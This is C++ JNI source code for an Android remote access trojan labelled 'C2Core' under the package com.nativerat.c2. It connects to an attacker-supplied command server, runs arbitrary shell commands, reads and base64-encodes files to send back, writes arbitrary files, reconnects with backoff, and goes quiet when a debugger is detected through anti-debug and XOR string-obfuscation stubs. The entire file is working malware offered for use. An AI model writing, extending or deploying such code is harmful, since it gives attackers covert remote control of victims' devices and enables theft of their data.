#include <jni.h>
#include <android/log.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <pthread.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#define LOG_TAG "C2Core"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

extern "C" {
    void decrypt_str(const char* in, char* out, int len, unsigned char key); // string_xor.S
    int anti_debug_check(void);                                              // anti_debug.S
}

static volatile int g_stop = 0;
static std::string g_info;

// ---------------- base64 ----------------
static const char b64tab[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string b64_encode(const unsigned char* data, size_t len) {
    std::string out;
    int val = 0, valb = -6;
    for (size_t i = 0; i < len; i++) {
        val = (val << 8) + data[i];
        valb += 8;
        while (valb >= 0) {
            out.push_back(b64tab[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(b64tab[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static std::vector<unsigned char> b64_decode(const std::string& in) {
    std::vector<unsigned char> out;
    int val = 0, valb = -8;
    for (char c : in) {
        if (c == '=') break;
        int d = b64_val(c);
        if (d < 0) continue;
        val = (val << 6) + d;
        valb += 6;
        if (valb >= 0) {
            out.push_back((unsigned char)((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

// ---------------- helpers ----------------
static std::string run_shell(const std::string& cmd) {
    std::string result;
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "ERR popen failed";
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp)) result += buf;
    pclose(fp);
    return result;
}

static std::string read_file_b64(const std::string& path) {
    FILE* f = fopen(path.c_str(), "rb");
    if (!f) return "ERR cannot open file";
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz < 0 || sz > 20 * 1024 * 1024) { fclose(f); return "ERR file too large"; }
    std::vector<unsigned char> buf((size_t)sz);
    if (sz > 0 && fread(buf.data(), 1, (size_t)sz, f) != (size_t)sz) {
        fclose(f); return "ERR read failed";
    }
    fclose(f);
    return b64_encode(buf.data(), buf.size());
}

static int write_file_b64(const std::string& path, const std::string& b64) {
    auto data = b64_decode(b64);
    FILE* f = fopen(path.c_str(), "wb");
    if (!f) return -1;
    if (!data.empty() && fwrite(data.data(), 1, data.size(), f) != data.size()) {
        fclose(f); return -1;
    }
    fclose(f);
    return 0;
}

// ---------------- protocol ----------------
// Har response:  "OK <len>\n<data>"  ya  "ERR <msg>\n"
static void send_data(FILE* wf, const char* tag, const std::string& data) {
    fprintf(wf, "%s %zu\n", tag, data.size());
    fwrite(data.data(), 1, data.size(), wf);
    fflush(wf);
}

static void handle_command(int fd, const std::string& line, FILE* wf) {
    if (line.rfind("SHELL ", 0) == 0) {
        std::string r = run_shell(line.substr(6));
        if (r.rfind("ERR", 0) == 0) send_data(wf, "ERR", r);
        else send_data(wf, "OK", r);
    } else if (line.rfind("GET ", 0) == 0) {
        std::string r = read_file_b64(line.substr(4));
        if (r.rfind("ERR", 0) == 0) send_data(wf, "ERR", r);
        else send_data(wf, "OK", r);
    } else if (line.rfind("PUT ", 0) == 0) {
        size_t sp = line.find(' ', 4);
        if (sp == std::string::npos) { send_data(wf, "ERR", "usage: PUT <path> <b64>"); return; }
        std::string path = line.substr(4, sp - 4);
        std::string b64 = line.substr(sp + 1);
        if (write_file_b64(path, b64) == 0) send_data(wf, "OK", "written");
        else send_data(wf, "ERR", "write failed");
    } else if (line == "INFO") {
        send_data(wf, "OK", g_info);
    } else if (line.rfind("SLEEP ", 0) == 0) {
        int sec = atoi(line.c_str() + 6);
        if (sec > 0 && sec <= 3600) sleep(sec);
        send_data(wf, "OK", "slept");
    } else if (line == "EXIT") {
        g_stop = 1;
        send_data(wf, "OK", "bye");
    } else {
        send_data(wf, "ERR", "unknown command");
    }
    (void)fd;
}

static std::string read_line(int fd) {
    std::string line;
    char c;
    while (recv(fd, &c, 1, 0) == 1) {
        if (c == '\n') break;
        line += c;
        if (line.size() > (1024 * 1024)) break;
    }
    return line;
}

// ---------------- connection ----------------
static int connect_host(const std::string& host, int port) {
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char port_s[16];
    snprintf(port_s, sizeof(port_s), "%d", port);
    if (getaddrinfo(host.c_str(), port_s, &hints, &res) != 0) return -1;
    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) { freeaddrinfo(res); return -1; }
    struct timeval tv{10, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, res->ai_addr, res->ai_addrlen) != 0) {
        close(fd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    return fd;
}

static void* c2_thread_entry(void* arg) {
    auto* cfg = static_cast<std::pair<std::string, int>*>(arg);
    std::string host = cfg->first;
    int port = cfg->second;
    delete cfg;

    int backoff = 3;
    while (!g_stop) {
        // debugger pakda -> chup ho jao
        if (anti_debug_check()) { sleep(30); continue; }

        int fd = connect_host(host, port);
        if (fd < 0) {
            sleep(backoff);
            if (backoff < 60) backoff *= 2;
            continue;
        }
        backoff = 3;
        LOGI("connected to %s:%d", host.c_str(), port);

        int wfd = dup(fd);
        FILE* wf = fdopen(wfd, "w");
        if (wf) {
            // Assembly se decrypt kiya hua handshake tag (C2-AGENT, key 0x2A)
            char tag[16];
            decrypt_str("\x69\x18\x07\x6b\x6d\x6f\x64\x7e\x00", tag, 9, 0x2A);
            fprintf(wf, "HELLO %s %s\n", tag, g_info.c_str());
            fflush(wf);

            while (!g_stop) {
                std::string line = read_line(fd);
                if (line.empty()) break;
                handle_command(fd, line, wf);
            }
            fclose(wf);
        }
        close(fd);
        sleep(backoff);
    }
    return nullptr;
}

// ---------------- JNI ----------------
extern "C" JNIEXPORT jint JNICALL
Java_com_nativerat_c2_NativeBridge_startC2(
        JNIEnv* env, jobject, jstring jhost, jint port, jstring jinfo) {
    const char* host = env->GetStringUTFChars(jhost, nullptr);
    const char* info = env->GetStringUTFChars(jinfo, nullptr);
    g_info = info;
    g_stop = 0;
    std::string h = host;
    int p = (int)port;
    env->ReleaseStringUTFChars(jhost, host);
    env->ReleaseStringUTFChars(jinfo, info);

    pthread_t tid;
    pthread_create(&tid, nullptr, c2_thread_entry, new std::pair<std::string, int>(h, p));
    pthread_detach(tid);
    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_nativerat_c2_NativeBridge_stopC2(JNIEnv*, jobject) {
    g_stop = 1;
    return 0;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_nativerat_c2_NativeBridge_runSelfTest(JNIEnv* env, jobject) {
    char tag[16];
    decrypt_str("\x69\x18\x07\x6b\x6d\x6f\x64\x7e\x00", tag, 9, 0x2A); // -> "C2-AGENT"
    int traced = anti_debug_check();
    char out[64];
    snprintf(out, sizeof(out), "decrypt=%s traced=%d", tag, traced);
    return env->NewStringUTF(out);
}